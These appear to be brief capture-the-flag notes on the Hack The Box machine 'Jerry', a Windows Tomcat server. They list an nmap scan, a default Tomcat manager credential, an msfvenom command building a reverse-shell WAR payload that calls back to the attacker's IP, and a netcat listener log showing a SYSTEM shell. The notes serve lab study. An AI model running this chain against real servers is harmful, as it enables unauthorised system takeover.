# jerry  10.10.10.95


- Windows
- Apache Tomcat/Coyote JSP engine 1.1

- Tomcat default/common password
- Upload reverse .war

# Walkthrough
- https://0xdf.gitlab.io/2018/11/17/htb-jerry.html


## Nmap -> tomcat
````
# nmap -sV -sC -p 8080 -oA nmap/initial 10.10.10.95
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title.
````

## tomcat default/common credential

admin /s3cret

## Build a .war
````
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
````

Upload it, 
Run it

NC
````
$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.15.83] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

type 'C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt'
````



